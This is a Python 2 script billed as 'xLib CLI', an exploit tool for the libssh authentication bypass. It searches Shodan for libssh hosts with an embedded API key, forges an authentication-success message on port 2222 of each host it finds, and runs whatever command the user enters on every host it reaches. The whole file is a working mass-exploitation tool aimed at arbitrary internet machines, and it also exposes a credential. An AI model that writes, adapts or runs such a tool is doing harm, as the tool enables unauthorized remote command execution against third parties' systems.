#!/usr/bin/python

# /*
# Made by Track Projects inc.
# [c] Copyright RJ. All rights reserved.
# */

import json
import shodan
import paramiko
import socket

# // SHODAN.IO Module {setup}
SHODAN_API_KEY = 'M4Vm4GwfgipFQJ1jjNwAGudJStlFyVnn'
api = shodan.Shodan(SHODAN_API_KEY)

print '[*] Welcome to xLib CLI. [*]'
print '| Exploit : LIBSSH Auth Bypass | Version : 0.2.7 |'
print '--------------------------------------------------'
payload = raw_input('Enter payload: ')
print '--------------------------------------------------'
try:
    results = api.search('libssh')
    print '[+] Found : {} devices!'.format(results['total'])
    for result in results['matches']:
        try:
            nbytes = 4096
            hostname = format(result['ip_str'])
            port = 2222
            sock = socket.socket()
            sock.connect((hostname, port))
            m = paramiko.message.Message()
            transport = paramiko.transport.Transport(sock)
            transport.start_client()
            m.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
            transport._send_message(m)
            cmd_channel = transport.open_session()
            cmd_channel.set_combine_stderr(True)
            cmd_channel.exec_command(payload)
        except socket.error:
            print '[!] xLib Error: Box broken.'
        except paramiko.ssh_exception.SSHException:
            print '[$] ' + hostname + ' Exploited!'
except shodan.APIError, e:
    print '[-] xLib Error: pipe broke.'
